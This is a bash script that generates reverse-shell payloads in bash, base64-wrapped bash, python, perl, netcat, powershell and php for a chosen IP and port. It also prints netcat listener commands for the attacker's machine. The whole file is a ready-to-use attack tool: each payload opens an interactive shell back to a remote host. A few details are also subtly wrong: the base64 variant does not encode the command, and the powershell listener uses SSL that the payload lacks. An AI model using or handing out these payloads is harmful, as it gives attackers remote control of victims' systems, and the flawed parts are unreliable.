#!/bin/bash

function usage() {
    echo "Usage: $0 <language> <ip_address> <port>"
    echo "Available languages:"
    echo "  - bash"
    echo "  - bash_base64"
    echo "  - python"
    echo "  - perl"
    echo "  - nc (netcat)"
    echo "  - powershell"
    echo "  - php"
    exit 1
}

function validate_ip() {
    if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        return 0
    else
        return 1
    fi
}

function validate_port() {
    if [[ $1 =~ ^[0-9]+$ ]] && [ $1 -ge 1 ] && [ $1 -le 65535 ]; then
        return 0
    else
        return 1
    fi
}

if [ "$#" -ne 3 ]; then
    usage
fi

language="$1"
ip="$2"
port="$3"

if ! validate_ip "$ip"; then
    echo "Invalid IP address"
    exit 1
fi

if ! validate_port "$port"; then
    echo "Invalid port number"
    exit 1
fi

declare -A payloads

payloads=(
    ["bash"]="bash -i >& /dev/tcp/$ip/$port 0>&1"
    ["bash_base64"]="bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' | base64"
    ["python"]="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    ["perl"]="perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    ["nc"]="nc -e /bin/sh $ip $port"
    ["powershell"]="powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
    ["php"]="php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
)

if [[ -z "${payloads["$language"]}" ]]; then
    echo "Invalid language specified"
    exit 1
fi

echo "Generated reverse shell payload for $language:"
echo "${payloads["$language"]}"

# Listener instructions
echo ""
echo "To listen on the attacker's machine, use the following command based on the chosen language:"
echo ""

case "$language" in
    "bash" | "bash_base64" | "python" | "perl" | "php")
        echo "For $language, use netcat:"
        echo "nc -lvp $port"
        ;;
    "nc")
        echo "For $language (netcat), use netcat:"
        echo "nc -lvp $port"
        ;;
    "powershell")
        echo "For $language, use ncat (from Nmap) or netcat with the -k option (if supported):"
        echo "ncat -lvp $port --ssl"
        echo "or"
        echo "nc -lvp $port -k"
        ;;
    *)
        echo "Invalid language specified"
        exit 1
        ;;
esac

